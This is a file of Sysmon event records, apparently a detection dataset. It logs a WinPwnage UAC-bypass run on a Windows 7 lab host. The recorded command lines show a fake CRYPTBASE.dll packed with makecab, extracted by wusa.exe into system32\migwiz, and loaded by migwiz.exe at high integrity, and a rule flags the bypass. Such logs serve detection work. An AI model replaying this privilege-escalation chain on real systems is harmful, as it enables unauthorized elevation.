@@ -1,0 +1,730 @@
+[
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 16:46:10.125532+00:00"
+                },
+                "EventRecordID": "15969",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2008",
+                    "@ThreadID": "1992"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 16:46:10.125"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-fc52-5cd6-0000-0010357f1200}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3812"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "python  winpwnage.py -u uac -i 13 -p c:\\Users\\IEUser\\Desktop\\hellox86.dll"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-f9cd-5cd6-0000-002065370100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013765"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-fab8-5cd6-0000-0010da8f0a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "300"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\cmd.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "\"C:\\Windows\\system32\\cmd.exe\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "11"
+                },
+                "Version": "2",
+                "Level": "4",
+                "Task": "11",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 16:46:10.344282+00:00"
+                },
+                "EventRecordID": "15970",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2008",
+                    "@ThreadID": "1992"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 16:46:10.344"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-fc52-5cd6-0000-0010357f1200}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3812"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "c:\\python27\\python.exe"
+                    },
+                    {
+                        "@Name": "TargetFilename",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\CRYPTBASE.dll"
+                    },
+                    {
+                        "@Name": "CreationUtcTime",
+                        "#text": "2019-05-11 16:46:10.344"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 16:46:15.500532+00:00"
+                },
+                "EventRecordID": "15971",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2008",
+                    "@ThreadID": "1992"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 16:46:15.406"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-fc57-5cd6-0000-00101faf1200}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3884"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\makecab.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Microsoft\u00ae Cabinet Maker"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\makecab.exe\" c:\\users\\ieuser\\appdata\\local\\temp\\CRYPTBASE.dll c:\\users\\ieuser\\appdata\\local\\temp\\suspicious.cab"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-f9cd-5cd6-0000-002065370100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013765"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-fc52-5cd6-0000-0010357f1200}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "3812"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u uac -i 13 -p c:\\Users\\IEUser\\Desktop\\hellox86.dll"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "11"
+                },
+                "Version": "2",
+                "Level": "4",
+                "Task": "11",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 16:46:15.547407+00:00"
+                },
+                "EventRecordID": "15972",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2008",
+                    "@ThreadID": "1992"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 16:46:15.484"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-fc57-5cd6-0000-00101faf1200}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3884"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\makecab.exe"
+                    },
+                    {
+                        "@Name": "TargetFilename",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\suspicious.cab"
+                    },
+                    {
+                        "@Name": "CreationUtcTime",
+                        "#text": "2019-05-11 16:46:15.484"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 16:46:20.531782+00:00"
+                },
+                "EventRecordID": "15973",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2008",
+                    "@ThreadID": "1992"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 16:46:20.422"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-fc5c-5cd6-0000-001045db1200}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3756"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\wusa.exe\" c:\\users\\ieuser\\appdata\\local\\temp\\suspicious.cab /extract:C:\\Windows\\system32\\migwiz /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-f9cd-5cd6-0000-002065370100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013765"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-fc52-5cd6-0000-0010357f1200}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "3812"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u uac -i 13 -p c:\\Users\\IEUser\\Desktop\\hellox86.dll"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 16:46:20.828657+00:00"
+                },
+                "EventRecordID": "15974",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2008",
+                    "@ThreadID": "1992"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 16:46:20.688"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-fc5c-5cd6-0000-0010e9f61200}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "1256"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\wusa.exe\" c:\\users\\ieuser\\appdata\\local\\temp\\suspicious.cab /extract:C:\\Windows\\system32\\migwiz /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Windows\\system32\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-f9cd-5cd6-0000-00201b370100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x000000000001371b"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-fc52-5cd6-0000-0010357f1200}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "3812"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u uac -i 13 -p c:\\Users\\IEUser\\Desktop\\hellox86.dll"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "7"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "7",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 16:46:26.203657+00:00"
+                },
+                "EventRecordID": "15975",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2008",
+                    "@ThreadID": "1992"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName",
+                        "#text": "Possible UAC Bypass - mcx2prov DLL"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 16:46:26.000"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-fc61-5cd6-0000-0010141a1300}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3240"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\migwiz\\migwiz.exe"
+                    },
+                    {
+                        "@Name": "ImageLoaded",
+                        "#text": "C:\\Windows\\System32\\migwiz\\CRYPTBASE.dll"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "?"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=AA3BF7118AE8138859FC0EE9202684C6DA22C176,MD5=3F090AA1CAE8B179F93B2064B8609AE2,SHA256=AC1DD32C41F6002BDF2EB564653FF23E069594CE55F9E22093355084EE28A6FD,IMPHASH=10D8CBCC4D9E244D697F1C09224856DC"
+                    },
+                    {
+                        "@Name": "Signed",
+                        "#text": "false"
+                    },
+                    {
+                        "@Name": "Signature"
+                    },
+                    {
+                        "@Name": "SignatureStatus",
+                        "#text": "Unavailable"
+                    }
+                ]
+            }
+        }
+    }
+]
